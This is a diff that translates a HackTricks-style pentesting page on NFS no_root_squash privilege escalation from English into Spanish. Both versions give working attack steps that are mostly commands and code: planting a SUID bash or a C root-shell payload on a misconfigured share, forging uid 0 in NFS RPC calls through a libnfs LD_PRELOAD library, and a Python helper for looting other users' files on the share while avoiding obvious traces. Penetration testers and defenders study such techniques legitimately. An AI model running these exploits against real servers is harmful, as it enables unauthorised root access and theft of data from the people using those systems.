@@ -1,36 +1,16 @@
+Lea el archivo _**/etc/exports**_, si encuentra algún directorio que esté configurado como **no\_root\_squash**, entonces puede **acceder** a él desde **un cliente** y **escribir dentro** de ese directorio **como si fuera** el **root** local de la máquina.
 
+**no\_root\_squash**: Esta opción básicamente da autoridad al usuario root en el cliente para acceder a los archivos en el servidor NFS como root. Y esto puede llevar a graves implicaciones de seguridad.
 
-<details>
+**no\_all\_squash:** Esto es similar a la opción **no\_root\_squash** pero se aplica a **usuarios no root**. Imagina que tienes una shell como usuario nobody; revisa el archivo /etc/exports; la opción no\_all\_squash está presente; revisa el archivo /etc/passwd; emula un usuario no root; crea un archivo suid como ese usuario (montando usando nfs). Ejecuta el suid como usuario nobody y conviértete en un usuario diferente.
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+# Escalada de Privilegios
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+## Exploit Remoto
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+Si ha encontrado esta vulnerabilidad, puede explotarla:
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
-
-</details>
-
-
-Read the _ **/etc/exports** _ file, if you find some directory that is configured as **no\_root\_squash**, then you can **access** it from **as a client** and **write inside** that directory **as** if you were the local **root** of the machine.
-
-**no\_root\_squash**: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implications.
-
-**no\_all\_squash:** This is similar to **no\_root\_squash** option but applies to **non-root users**. Imagine, you have a shell as nobody user; checked /etc/exports file; no\_all\_squash option is present; check /etc/passwd file; emulate a non-root user; create a suid file as that user (by mounting using nfs). Execute the suid as nobody user and become different user.
-
-# Privilege Escalation
-
-## Remote Exploit
-
-If you have found this vulnerability, you can exploit it:
-
-* **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder the **/bin/bash** binary and giving it **SUID** rights, and **executing from the victim** machine that bash binary.
-
+* **Montando ese directorio** en una máquina cliente, y **copiando como root** dentro de la carpeta montada el binario **/bin/bash** y dándole derechos **SUID**, y **ejecutando desde la máquina víctima** ese binario bash.
 ```bash
 #Attacker, as root user
 mkdir /tmp/pe
@@ -43,9 +23,7 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-
-* **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder our come compiled payload that will abuse the SUID permission, give to it **SUID** rights, and **execute from the victim** machine that binary (you can find here some[ C SUID payloads](payloads-to-execute.md#c)).
-
+* **Montando ese directorio** en una máquina cliente, y **como root copiando** dentro de la carpeta montada nuestro payload compilado que abusará del permiso SUID, dándole derechos SUID, y **ejecutando desde la máquina víctima** ese binario (puedes encontrar aquí algunos [payloads C SUID](payloads-to-execute.md#c)).
 ```bash
 #Attacker, as root user
 gcc payload.c -o payload
@@ -59,77 +37,65 @@ chmod +s payload
 cd <SHAREDD_FOLDER>
 ./payload #ROOT shell
 ```
-
-## Local Exploit
+## Explotación Local
 
 {% hint style="info" %}
-Note that if you can create a **tunnel from your machine to the victim machine you can still use the Remote version to exploit this privilege escalation tunnelling the required ports**.\
-The following trick is in case the file `/etc/exports` **indicates an IP**. In this case you **won't be able to use** in any case the **remote exploit** and you will need to **abuse this trick**.\
-Another required requirement for the exploit to work is that **the export inside `/etc/export`** **must be using the `insecure` flag**.\
-\--_I'm not sure that if `/etc/export` is indicating an IP address this trick will work_--
+Tenga en cuenta que si puede crear un **túnel desde su máquina hasta la máquina víctima, aún puede usar la versión remota para explotar esta escalada de privilegios tunelizando los puertos requeridos**.\
+El siguiente truco es en caso de que el archivo `/etc/exports` **indique una dirección IP**. En este caso, no podrá usar en ningún caso el **exploit remoto** y necesitará **abusar de este truco**.\
+Otro requisito necesario para que funcione el exploit es que **la exportación dentro de `/etc/export` debe estar usando la bandera `insecure`**.\
+\--_No estoy seguro de que si `/etc/export` indica una dirección IP, este truco funcionará_--
 {% endhint %}
 
-**Trick copied from** [**https://www.errno.fr/nfs\_privesc.html**](https://www.errno.fr/nfs\_privesc.html)
+**Truco copiado de** [**https://www.errno.fr/nfs\_privesc.html**](https://www.errno.fr/nfs\_privesc.html)
 
-Now, let’s assume that the share server still runs `no_root_squash` but there is something preventing us from mounting the share on our pentest machine. This would happen if the `/etc/exports` has an explicit list of IP addresses allowed to mount the share.
+Ahora, supongamos que el servidor de recursos aún ejecuta `no_root_squash`, pero hay algo que nos impide montar el recurso compartido en nuestra máquina de prueba de penetración. Esto sucedería si `/etc/exports` tiene una lista explícita de direcciones IP permitidas para montar el recurso compartido.
 
-Listing the shares now shows that only the machine we’re trying to privesc on is allowed to mount it:
-
+Al listar los recursos compartidos ahora, se muestra que solo la máquina en la que estamos intentando realizar la escalada de privilegios tiene permiso para montarlo:
 ```
 [root@pentest]# showmount -e nfs-server
 Export list for nfs-server:
 /nfs_root   machine
 ```
+Esto significa que estamos atrapados explotando el recurso compartido montado en la máquina localmente desde un usuario sin privilegios. Pero resulta que hay otra vulnerabilidad local menos conocida.
 
-This means that we’re stuck exploiting the mounted share on the machine locally from an unprivileged user. But it just so happens that there is another, lesser known local exploit.
+Esta vulnerabilidad se basa en un problema en la especificación NFSv3 que establece que es responsabilidad del cliente anunciar su uid/gid al acceder al recurso compartido. ¡Por lo tanto, es posible falsificar el uid/gid mediante la falsificación de las llamadas NFS RPC si el recurso compartido ya está montado!
 
-This exploit relies on a problem in the NFSv3 specification that mandates that it’s up to the client to advertise its uid/gid when accessing the share. Thus it’s possible to fake the uid/gid by forging the NFS RPC calls if the share is already mounted!
+Aquí hay una [biblioteca que te permite hacer precisamente eso](https://github.com/sahlberg/libnfs).
 
-Here’s a [library that lets you do just that](https://github.com/sahlberg/libnfs).
+### Compilando el ejemplo <a href="#compiling-the-example" id="compiling-the-example"></a>
 
-### Compiling the example <a href="#compiling-the-example" id="compiling-the-example"></a>
-
-Depending on your kernel, you might need to adapt the example. In my case I had to comment out the fallocate syscalls.
-
+Dependiendo de tu kernel, es posible que necesites adaptar el ejemplo. En mi caso, tuve que comentar las llamadas al sistema fallocate.
 ```bash
 ./bootstrap
 ./configure
 make
 gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
 ```
+### Explotando usando la librería <a href="#exploiting-using-the-library" id="exploiting-using-the-library"></a>
 
-### Exploiting using the library <a href="#exploiting-using-the-library" id="exploiting-using-the-library"></a>
-
-Let’s use the simplest of exploits:
-
+Utilicemos el exploit más simple:
 ```bash
 cat pwn.c
 int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
 gcc pwn.c -o a.out
 ```
-
-Place our exploit on the share and make it suid root by faking our uid in the RPC calls:
-
+Coloque nuestro exploit en el recurso compartido y hágalo suid root falsificando nuestro uid en las llamadas RPC:
 ```
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
 ```
-
-All that’s left is to launch it:
-
+Todo lo que queda es lanzarlo:
 ```
 [w3user@machine libnfs]$ /mnt/share/a.out
 [root@machine libnfs]#
 ```
-
-There we are, local root privilege escalation!
+¡Ahí estamos, escalada de privilegios de root local!
 
 ## Bonus NFShell <a href="#bonus-nfshell" id="bonus-nfshell"></a>
 
-Once local root on the machine, I wanted to loot the NFS share for possible secrets that would let me pivot. But there were many users of the share all with their own uids that I couldn’t read despite being root because of the uid mismatch. I didn’t want to leave obvious traces such as a chown -R, so I rolled a little snippet to set my uid prior to running the desired shell command:
-
+Una vez que obtuve el control de root local en la máquina, quise saquear el recurso compartido de NFS en busca de posibles secretos que me permitieran pivotear. Pero había muchos usuarios del recurso compartido, cada uno con su propio UID que no podía leer a pesar de ser root debido a la falta de coincidencia de UID. No quería dejar rastros obvios como un chown -R, así que escribí un pequeño fragmento de código para establecer mi UID antes de ejecutar el comando de shell deseado:
 ```python
 #!/usr/bin/env python
 import sys
@@ -147,9 +113,7 @@ uid = get_file_uid(filepath)
 os.setreuid(uid, uid)
 os.system(' '.join(sys.argv[1:]))
 ```
-
-You can then run most commands as you normally would by prefixing them with the script:
-
+Entonces, puedes ejecutar la mayoría de los comandos como lo harías normalmente, prefijándolos con el script:
 ```
 [root@machine .tmp]# ll ./mount/
 drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
@@ -161,22 +125,18 @@ drwxr-x---  4 1008 1009 1024 Apr  5  2017 conf
 drwx------ 15 1008 1009 1024 Apr  5  2017 data
 drwxr-x---  2 1008 1009 1024 Apr  5  2017 install
 ```
-
-
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
-
-
